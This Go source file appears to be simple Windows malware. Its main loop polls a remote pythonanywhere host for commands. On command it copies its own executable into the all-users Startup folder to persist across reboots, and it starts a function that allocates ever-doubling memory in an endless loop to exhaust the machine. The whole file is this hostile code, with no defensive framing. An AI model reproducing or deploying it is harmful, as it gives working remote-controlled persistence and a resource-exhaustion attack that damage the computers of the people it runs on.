package main

import (
	"fmt"
	"os"
	"net/http"
	"io/ioutil"
	"path/filepath"
	"time"
	"strings"
)

func ErrCheck(err error) bool {
	if err != nil {
		return true
	}
	return false
}

func copy_to() string {
	winDir := os.Getenv("ProgramData")
	if winDir == "" {
		return "Failed to find the correct path."
	}
	startup := filepath.Join(winDir, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	src := "main.exe"
	dest := startup+"\\"+src
	bytesRead, err := ioutil.ReadFile(src)
	if ErrCheck(err) {
		return "Sth went wrong!"
	}
	err = ioutil.WriteFile(dest, bytesRead, 0644)
	if ErrCheck(err) {
		return "Sth went wrong!"
	}
	fmt.Println("Looks perfect I think?")
	return "Everything looks okay =)"
}

func start() {
	i := 10_000_000
	count := 0
	for {
		vir := make([]int, i)
		if count == 10000 {
			time.Sleep(3 * time.Second)
			count = 0
			fmt.Println(vir)
		}
		count += 1
		i*=2
		fmt.Println(i)
	}
}

func main() {
	for {
		res, err := http.Get("http://dasturchibro.pythonanywhere.com/playwithgo")
		ErrCheck(err)
		defer res.Body.Close()

		body, err := ioutil.ReadAll(res.Body)
		if ErrCheck(err) {
			return
		}
    	sbody := strings.Join(strings.Fields(string(body)),"")
		if sbody == "copy" {
			// http.Get("http://127.0.0.1:8080/?resp="+copy_to())
			fmt.Println(copy_to())
		} else if sbody == "exit" {
			fmt.Println("Exit command performed!")
			break
		} else if sbody == "start" {
			copy_to()
			start()
		}
	}
}
// C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup>
